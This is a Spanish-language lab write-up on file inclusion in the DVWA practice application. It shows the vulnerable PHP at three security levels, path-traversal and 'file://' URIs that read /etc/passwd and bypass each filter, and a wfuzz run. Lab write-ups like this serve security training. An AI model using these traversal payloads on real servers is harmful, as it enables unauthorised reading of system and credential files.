# FI

File inclusion es una vulnerabilidad que permite a un atacante leer archivos arbitrarios en el servidor. Esto puede ser utilizado para leer archivos sensibles como `passwd` o para leer el código fuente de la aplicación.

La vulnerabilidad se puede distinguir en dos tipos:

- **[Local File Inclusion (LFI)](LFI.md)**: Se produce cuando el archivo que se incluye se encuentra en el mismo servidor que la aplicación vulnerable.
- **[Remote File Inclusion (RFI)](RFI.md)**: Se produce cuando el archivo que se incluye se encuentra en otro servidor.

Durante el desarrollo de la actividad se descrubió que existia también el fichero `file4.php` que no se mencionaba en la documentación pero que si que se podía acceder a el mediante la URI:

```
http://localhost/DVWA/vulnerabilities/fi/?page=file4.php
```

![file4](/FI/assets/file4.png)

## Nivel: `bajo`

### Código vulnerable
```php
$file = $_GET[ 'page' ];
```

Para comprobar que la aplicación es vulnerable a la vulnerabilidad de `FI` se puede utilizar la siguiente URI:

```
http://localhost/DVWA/vulnerabilities/fi/?page=../../../../../../etc/passwd
```

![check1](/FI/assets/check-low.png)

---

Durante la realización del nivel bajo se probó la herramienta `wfuzz` para hacer fuzzing de la URI, pero no se obtuvo ningún resultado extra.
Realmente el uso de la herramienta no nos ayudo a solucionar el reto, pero si que nos ayudo a entender como funciona la herramienta y posibles usos de la misma.

```
wfuzz -c --hl 81 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt -b "security=low; PHPSESSID=eboalr1aom47l322etbqjebovg" "http://localhost/DVWA/vulnerabilities/fi/?page=../../hackable/flags/FUZZ.php"
/usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://localhost/DVWA/vulnerabilities/fi/?page=../../hackable/flags/FUZZ.php
Total requests: 81643

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    
=====================================================================

000001463:   200        92 L     267 W      3491 Ch     "fi"                                                                                                                                                                       

Total time: 0
Processed Requests: 81643
Filtered Requests: 81642
Requests/sec.: 0
```

## Nivel: `medio`


### Código vulnerable

```php
$file = $_GET[ 'page' ];
$file = str_replace( array( "http://", "https://" ), "", $file );
$file = str_replace( array( "../", "..\\" ), "", $file );
```

Para comprobar que la aplicación es vulnerable a la vulnerabilidad de `FI` se puede utilizar la siguiente URI:

```
http://localhost/DVWA/vulnerabilities/fi/?page=....//....//....//....//....//....//etc/passwd
```

![check-mid](/FI/assets/check-mid.png)

## Nivel: `alto`

### Código vulnerable

```php
$file = $_GET[ 'page' ];
if (!fnmatch( "file*", $file ) && $file != "include.php") {exit}
```

Para comprobar que la aplicación es vulnerable a la vulnerabilidad de `FI` se puede utilizar la siguiente URI:

```
http://localhost/DVWA/vulnerabilities/fi/?page=file:///etc/passwd
```

![check-high](/FI/assets/check-high.png)

## Referencias

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [HTB Academy](https://academy.hackthebox.com/module/77/section/725)
